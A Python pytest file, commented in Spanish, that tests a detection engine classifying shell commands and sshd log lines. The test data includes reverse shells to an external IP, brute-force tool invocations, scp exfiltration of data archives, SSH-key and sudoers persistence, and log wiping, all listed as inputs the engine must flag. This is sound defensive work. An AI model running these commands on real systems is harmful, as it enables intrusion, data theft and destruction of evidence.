"""
Reglas de red y de autenticación: lo que aparece en un log de sshd, del
cortafuegos o del servidor web, y que antes se quedaba en BAJA porque el motor
solo miraba comandos de Windows.

Se comprueban las tres cosas que importan de una regla nueva: que detecta lo
que dice detectar, que trae su técnica ATT&CK, y que no salta con el trabajo
normal de administración (un log real trae mucho más de eso que de ataque).
"""

import pytest

from agent.classifier.engine import ClassifierEngine
from agent.evidence.models import Criticality, EventSource, HostInfo, RawEvent
from app.modules.tracking import service
from app.modules.tracking.log_parser import parse_log_text

HOST = HostInfo(agent_id="t", hostname="h", os="linux")
MOTOR = ClassifierEngine.from_yaml(service.RULES_PATH)


def _clasificar(comando: str):
    evento = RawEvent(source=EventSource.LOG, event_type="command", host_info=HOST, payload={"command": comando})
    return MOTOR.classify_detallado(evento)


@pytest.mark.parametrize(
    ("comando", "criticidad", "regla"),
    [
        # --- shell inversa y túneles ---
        ("nc -e /bin/bash 185.220.101.7 4444", "CRITICAL", "shell_inverso"),
        ("bash -i >& /dev/tcp/185.220.101.7/4444 0>&1", "CRITICAL", "shell_inverso"),
        ("python3 -c 'import socket,subprocess,os;s=socket.socket()'", "CRITICAL", "shell_inverso"),
        ("ssh -R 4444:localhost:22 root@185.220.101.7", "HIGH", "tunel_o_redireccion_de_puertos"),
        ("ssh -D 1080 root@185.220.101.7", "HIGH", "tunel_o_redireccion_de_puertos"),
        ("netsh interface portproxy add v4tov4 listenport=3389 connectaddress=10.0.0.9", "HIGH", "tunel_o_redireccion_de_puertos"),
        ("ngrok tcp 3389", "HIGH", "tunel_o_redireccion_de_puertos"),
        # --- escaneo y fuerza bruta ---
        ("nmap -sS -p- 10.0.0.0/24", "HIGH", "escaneo_de_red_o_servicios"),
        ('185.220.101.7 - - [12/Sep/2026:02:20:11 +0200] "GET /wp-login.php" 200 "-" "sqlmap/1.7"', "HIGH", "escaneo_de_red_o_servicios"),
        ("hydra -l root -P rockyou.txt ssh://10.0.0.5", "HIGH", "herramienta_de_fuerza_bruta"),
        ("crackmapexec smb 10.0.0.0/24 -u adm -p Verano2026!", "HIGH", "herramienta_de_fuerza_bruta"),
        # --- cortafuegos y acceso persistente ---
        ("iptables -A INPUT -p tcp --dport 4444 -j ACCEPT", "HIGH", "regla_de_cortafuegos_modificada"),
        ("ufw allow 4444", "HIGH", "regla_de_cortafuegos_modificada"),
        ("netsh advfirewall firewall add rule name=rdp dir=in action=allow protocol=tcp localport=3389", "HIGH", "regla_de_cortafuegos_modificada"),
        ("echo ssh-rsa AAAAB3Nza >> /root/.ssh/authorized_keys", "HIGH", "acceso_persistente_ssh_o_sudo"),
        ("echo 'soporte ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/soporte", "HIGH", "acceso_persistente_ssh_o_sudo"),
        # --- cuentas, persistencia y borrado en Linux (reglas ya existentes) ---
        ("useradd -m -s /bin/bash soporte", "HIGH", "cuenta_o_grupo_modificado"),
        ("usermod -aG sudo soporte", "HIGH", "cuenta_o_grupo_modificado"),
        ("crontab -e", "HIGH", "persistencia_registro_o_tarea"),
        ("history -c", "CRITICAL", "borrado_evidencias_o_shadow_copies"),
        ("rm -rf /var/log/auth.log", "CRITICAL", "borrado_evidencias_o_shadow_copies"),
        ("journalctl --vacuum-time=1s", "CRITICAL", "borrado_evidencias_o_shadow_copies"),
        # --- movimiento lateral y exfiltración por SSH ---
        ("ssh admin@10.0.0.5", "HIGH", "movimiento_lateral"),
        ("ssh -i robada.pem root@10.0.0.9", "HIGH", "movimiento_lateral"),
        ("scp contabilidad.zip root@185.220.101.7:/tmp/", "CRITICAL", "exfiltracion_de_datos"),
        # --- reconocimiento de red y recursos compartidos ---
        ("netstat -ano", "MEDIUM", "reconocimiento_de_red"),
        ("arp -a", "MEDIUM", "reconocimiento_de_red"),
        ("nslookup panel.ejemplo-malo.net", "MEDIUM", "reconocimiento_de_red"),
        ("net view /domain", "MEDIUM", "reconocimiento_de_red"),
        ("ip addr", "MEDIUM", "reconocimiento_de_red"),
        (r"net use \\10.0.0.9\C$ /user:CORP\adm Verano2026!", "MEDIUM", "acceso_a_recurso_compartido"),
        ("mount -t cifs //10.0.0.9/datos /mnt/d", "MEDIUM", "acceso_a_recurso_compartido"),
        # --- líneas de log de autenticación, no comandos ---
        ("srv sshd[812]: Failed password for root from 203.0.113.50 port 51122 ssh2", "MEDIUM", "autenticacion_fallida"),
        ("srv sshd[820]: Failed password for invalid user admin from 203.0.113.50 port 51140 ssh2", "MEDIUM", "autenticacion_fallida"),
        ("Event ID: 4625 An account failed to log on", "MEDIUM", "autenticacion_fallida"),
        ("srv sshd[830]: Accepted publickey for mlopez from 203.0.113.50 port 51150 ssh2", "MEDIUM", "inicio_de_sesion_remoto"),
        ("srv sshd[830]: pam_unix(sshd:session): session opened for user root by (uid=0)", "MEDIUM", "inicio_de_sesion_remoto"),
    ],
)
def test_detecta_red_y_autenticacion(comando, criticidad, regla):
    resultado = _clasificar(comando)
    assert resultado.criticality == Criticality(criticidad)
    assert (resultado.regla.name if resultado.regla else None) == regla
    assert resultado.regla.mitre, "una regla sin técnica ATT&CK no sirve para el informe"


@pytest.mark.parametrize(
    "comando",
    [
        # administración normal: ni el log de un equipo sano puede llenarse de rojos
        "ping 8.8.8.8",
        "mount /dev/sdb1 /mnt/usb",
        "systemctl status sshd",
        "systemctl restart nginx",
        "history",
        "cat /etc/passwd",
        "echo escribe a pepe@empresa.com",
        "curl -u pepe@empresa.com https://api.empresa.com/estado",
        "tail -f /var/log/nginx/access.log",
        "df -h /var/log",
        "grep ssh /etc/services",
    ],
)
def test_no_salta_con_administracion_normal(comando):
    assert _clasificar(comando).criticality == Criticality.LOW


@pytest.mark.parametrize(
    ("linea", "usuario"),
    [
        ("Sep 12 02:10:01 srv sshd[812]: Failed password for root from 203.0.113.50 port 51122 ssh2", "root"),
        ("Sep 12 02:10:31 srv sshd[820]: Failed password for invalid user admin from 203.0.113.50 port 5 ssh2", "admin"),
        ("Sep 12 02:11:09 srv sshd[830]: Accepted publickey for mlopez from 203.0.113.50 port 51150 ssh2", "mlopez"),
        ("Sep 12 02:11:10 srv systemd-logind[700]: New session 7 of user mlopez.", "mlopez"),
        ("Sep 12 02:12:00 srv sudo: pepe : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash", "pepe"),
    ],
)
def test_usuario_en_lineas_de_autenticacion(linea, usuario):
    """En un auth.log el usuario no viene como `/user:`, sino en la propia frase.
    Sin esto, `usuario_detectado` quedaba vacío justo en el log que dice QUIÉN entró."""
    assert parse_log_text(linea, "auth.log")[0].payload["user"] == usuario


def test_intrusion_por_ssh_de_principio_a_fin():
    """La secuencia completa de una intrusión por SSH: escaneo, fuerza bruta,
    entrada, persistencia y borrado del rastro."""
    log = "\n".join([
        "Sep 12 02:09:00 srv sshd[800]: Failed password for root from 203.0.113.50 port 51100 ssh2",
        "Sep 12 02:09:04 srv sshd[802]: Failed password for root from 203.0.113.50 port 51104 ssh2",
        "Sep 12 02:09:20 srv sshd[810]: Accepted password for root from 203.0.113.50 port 51120 ssh2",
        "Sep 12 02:10:02 srv CMD: netstat -tunap",
        "Sep 12 02:11:40 srv CMD: useradd -m -s /bin/bash soporte",
        "Sep 12 02:12:10 srv CMD: echo ssh-rsa AAAAB3Nza >> /root/.ssh/authorized_keys",
        "Sep 12 02:14:55 srv CMD: scp /var/datos/clientes.zip root@185.220.101.7:/tmp/",
        "Sep 12 02:16:30 srv CMD: history -c",
    ])
    resultado = service.analyze_log_content(log, "auth.log")

    reglas = [e.regla for e in resultado.eventos]
    assert reglas == [
        "autenticacion_fallida",
        "autenticacion_fallida",
        "inicio_de_sesion_remoto",
        "reconocimiento_de_red",
        "cuenta_o_grupo_modificado",
        "acceso_persistente_ssh_o_sudo",
        "exfiltracion_de_datos",
        "borrado_evidencias_o_shadow_copies",
    ]
    assert resultado.por_severidad == {"critica": 2, "alta": 2, "media": 4}
    # la IP del atacante sale tanto del intento de entrada como de la exfiltración
    atacante = [i for i in resultado.indicadores if i.valor == "185.220.101.7"]
    assert atacante and atacante[0].tipo == "ip_publica"
    assert "T1110" in {t for e in resultado.eventos for t in e.mitre}
